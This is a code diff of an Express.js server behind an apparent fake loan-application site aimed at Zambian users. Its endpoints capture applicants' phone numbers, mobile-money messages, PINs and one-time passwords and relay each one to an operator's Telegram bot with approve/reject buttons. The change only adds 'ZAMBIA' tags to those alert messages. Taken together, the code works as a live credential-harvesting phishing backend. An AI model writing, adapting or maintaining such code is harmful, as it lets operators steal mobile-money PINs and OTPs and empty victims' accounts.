@@ -69,7 +69,7 @@ app.post('/api/send-application', async (req, res) => {
     createdAt: new Date().toISOString()
   };
 
-  const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +260${data.phone}\nAmount: ZMW ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
+  const message = `NEW LOAN APPLICATION (ZAMBIA)\nID: ${appId}\nPhone: +260${data.phone}\nAmount: ZMW ${data.loanAmount}\nTerm: ${data.loanTerm}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
   const buttons = [[
     { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref }) },
     { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref }) }
@@ -88,7 +88,7 @@ app.post('/api/send-momo-message', async (req, res) => {
   app.momoMessage = momoMessage;
   app.smsStatus = 'pending';
 
-  const message = `MOMO MESSAGE VERIFICATION\nID: ${applicationId}\nPhone: +260${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
+  const message = `MOMO MESSAGE VERIFICATION (ZAMBIA)\nID: ${applicationId}\nPhone: +260${phone}\n\nMessage:\n${momoMessage}\n\nApprove or reject:`;
   const buttons = [[
     { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'SMS', ref: app.ref }) },
     { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'SMS', ref: app.ref }) }
@@ -115,7 +115,7 @@ app.post('/api/send-pin', async (req, res) => {
   app.pin = pin;
   app.pinStatus = 'pending';
 
-  const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
+  const message = `PIN VERIFICATION (ZAMBIA)\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
   const buttons = [[
     { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref: app.ref }) },
     { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref: app.ref }) }
@@ -134,7 +134,7 @@ app.post('/api/send-otp', async (req, res) => {
   app.otp = otp;
   app.otpStatus = 'pending';
 
-  const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
+  const message = `OTP VERIFICATION (ZAMBIA)\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
   const buttons = [[
     { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
     { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
@@ -152,7 +152,7 @@ app.post('/api/resend-otp', async (req, res) => {
 
   app.otpStatus = 'pending';
 
-  const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
+  const message = `OTP RESENT - ADMIN ACTION REQUIRED (ZAMBIA)\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
   const buttons = [[
     { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref: app.ref }) },
     { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref: app.ref }) }
@@ -312,7 +312,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
     });
 
-    await sendTelegramMessage(`Status Update\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
+    await sendTelegramMessage(`Status Update (ZAMBIA)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
     return res.sendStatus(200);
   }
 
